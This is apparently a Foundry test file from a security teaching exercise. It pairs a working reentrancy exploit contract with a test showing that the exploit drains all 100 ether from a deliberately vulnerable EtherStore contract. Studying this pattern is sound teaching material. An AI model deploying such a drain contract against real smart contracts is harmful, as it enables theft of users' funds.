// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Test } from "forge-std/Test.sol";

import { EtherStore } from "../../contracts/vulnerable/ReEntrancy.sol";

/**
 * From Solidity by Example: https://solidity-by-example.org/hacks/re-entrancy/
 * Source:
 * https://github.com/Cyfrin/solidity-by-example.github.io/blob/f88d8ed8/contracts/src/hacks/re-entrancy/ReEntrancy.sol
 */
contract ReEntrancyAttack {
    function attack(EtherStore store) external payable {
        store.deposit{ value: msg.value }();
        store.withdraw();

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        uint256 storeBalance = address(msg.sender).balance;
        uint256 withdrawAmount = EtherStore(msg.sender).balances(address(this));

        if (storeBalance >= withdrawAmount) {
            EtherStore(msg.sender).withdraw();
        }
    }
}

contract EtherStoreReEntrant is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    uint256 constant ETHER_IN_STORE = 100 ether;
    uint256 constant INITIAL_BALANCE = 1 ether;

    EtherStore store = new EtherStore();

    modifier checkSolvedByPlayer() {
        vm.startPrank(attacker, attacker);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() external {
        startHoax(deployer);
        store.deposit{ value: ETHER_IN_STORE }();
        vm.deal(attacker, INITIAL_BALANCE);
        vm.stopPrank();
    }

    function test_assertInitialState() external view {
        assertEq(address(store).balance, ETHER_IN_STORE);
        assertEq(attacker.balance, INITIAL_BALANCE);
    }

    function test_reentrancy() external checkSolvedByPlayer {
        ReEntrancyAttack reEntrancy = new ReEntrancyAttack();
        reEntrancy.attack{ value: INITIAL_BALANCE }(store);
    }

    function _isSolved() internal view {
        assertEq(address(store).balance, 0, "Store still has ETH");
        assertEq(attacker.balance, INITIAL_BALANCE + ETHER_IN_STORE, "Not enough ETH in attacker account");
    }
}
